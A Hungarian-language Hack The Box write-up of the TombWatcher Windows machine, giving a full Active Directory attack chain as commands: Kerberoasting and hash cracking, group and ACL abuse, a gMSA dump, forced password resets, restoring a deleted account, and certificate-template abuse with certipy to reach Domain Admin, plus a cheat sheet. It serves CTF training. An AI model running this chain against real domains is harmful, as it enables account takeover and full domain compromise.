# HTB TombWatcher - Writeup (magyar)

**Platform:** Windows  
**IP:** 10.10.11.72

**Difficulty:** Medium 

---

## Recon / Felderítés

### NMAP

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows AD LDAP (SSL)
3268/tcp  open  ldap          Microsoft Windows AD LDAP (GC)
3269/tcp  open  ssl/ldap      Microsoft Windows AD LDAP (GC SSL)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
49666-49737/tcp több nyitott MSRPC port
```
### SMB + clock-skew

**Időszinkronizáció (fontos!):**

```
sudo rdate -n tombwatcher.htb
```

## BloodHound, Kerberoasting, első user chain

### BloodHound adatgyűjtés

```
nxc bloodhound -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb --no-pass-pol
```
- Generált zip-ből elemzés, sima "entry level" domain usert találsz (henry).

### Kerberoasting

```
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

- Eredmény: kerberoast hash, törhető **hashcattel**:

```
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

- **Eredmény:** alfred : bas*********

---

## Csoport abuse, gMSA, service user

### Csoporttagság bővítés

```
bloodyAD -u 'alfred' -p 'bas*******' -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred
```

### gMSA dump

```
python3 gMSADumper.py -u 'alfred' -p 'bas******' -d 'tombwatcher.htb'
```
- Hash: ansible_dev$ : <hash>

### Jelszócsere Sam userre

```
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'ansible_dev$' -p '<hash>' set password SAM 'NoSecHere!'
```

---

## WriteOwner / GenericAll abuse, John reset

### WriteOwner átvétel:

```
impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'NoSecHere!' -dc-ip 10.10.11.72
```

### GenericAll John felett (Sammel):

```
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'NoSecHere!' add genericAll john sam
```

### Jelszó reset John userre:

```
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'sam' -p 'NoSecHere!' set password john 'NoSecHere'
```

---

## User shell & user flag

### Evil-WinRM login:

```
evil-winrm -i 10.10.11.72 -u john -p NoSecHere
```

- **User flag:** C:\Users\john\Desktop\user.txt

---

## Törölt cert_admin AD objektum visszaállítása

- Keresés:
```
Get-ADObject -filter {SamAccountName -eq 'cert_admin'} -IncludeDeletedObjects
```
- Restore:
```
Restore-ADObject -Identity <GUID>
```
- Enable:
```
Enable-ADAccount -Identity cert_admin
```
- Jelszó reset:
```
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "NoSecHere" -AsPlainText -Force)
```

---

## ADCS escalation – Domain Admin certi chain

### Sablon enum:

```
certipy-ad find -u cert_admin -p 'NoSecHere' -dc-ip 10.10.11.72 -vulnerable
```

### Admin cert szerzés (régi certipy):

```
python3 entry.py req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -u cert_admin@tombwatcher.htb -p 'NoSecHere' -template WebServer -upn administrator@tombwatcher.htb -application-policies 1.3.6.1.5.5.7.3.2
```
- **UPN:** administrator@tombwatcher.htb

### Admin shell certtel (LDAP shell):

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -domain tombwatcher.htb -ldap-shell
```

- Jelszócsere domain adminra:
```
change_password administrator NoSecHere
```

---

## Root shell & root.txt

```
evil-winrm -i 10.10.11.72 -u administrator -p NoSecHere
```

- **Root flag:** C:\Users\Administrator\Desktop\root.txt

---

# Jegyzet / Casual tapasztalatok

- A kerberoast chain után jól jött, hogy mindenhol szinte instant csoport abuse megy
- A certipy verziók random szoptattak – classic chain csak pip install certipy==1.2.0 után jött ki
- Az AD objektum recovery és enable jó workflow volt, sok CTF-en nincs ilyen
- **ADCS UPN chain**: egy “szar” sablonból is lehet full admin, ha ügyesen kombinálod a policy OID-t!
- Root előtt, ha újra kell indítani HTB gépet, minden hasht/jelszót gyorsan jegyezz fel!

---

# Lessons learned

- AD privilege chain: ha az első foothold után végig tudsz menni a csoport-abuse-okon, szinte bármelyik userből lehet DA
- Kerberoast-tól ADCS-ig, minden láncszem kihozható open source toolokkal
- Pip-es certipy, gMSADumper, bloodyAD – mind gold
- Próbáld végig több environmentből is, ha szopat a workflow!
- HTB-s gépnél **a chain a lényeg, nem csak az 1-1 exploit!**

---

# Cheat Sheet

## Kerberoast hash törése
```
hashcat -m 13100 hashfile /usr/share/wordlists/rockyou.txt
```

## AD object restore
```
Get-ADObject -filter {SamAccountName -eq 'cert_admin'} -IncludeDeletedObjects
Restore-ADObject -Identity <GUID>
Enable-ADAccount -Identity cert_admin
```

## Certipy admin cert szerzés (régi pip-es):
```
python3 entry.py req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -u cert_admin@tombwatcher.htb -p 'NoSecHere' -template WebServer -upn administrator@tombwatcher.htb -application-policies 1.3.6.1.5.5.7.3.2
```

## Evil-WinRM shell DA-ként
```
evil-winrm -i 10.10.11.72 -u administrator -p NoSecHere

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/13/2025   7:13 AM             34 root.txt

```

---

## Ez volt a TombWatcher gép! Ha végigtoltad, instant respect! 👾

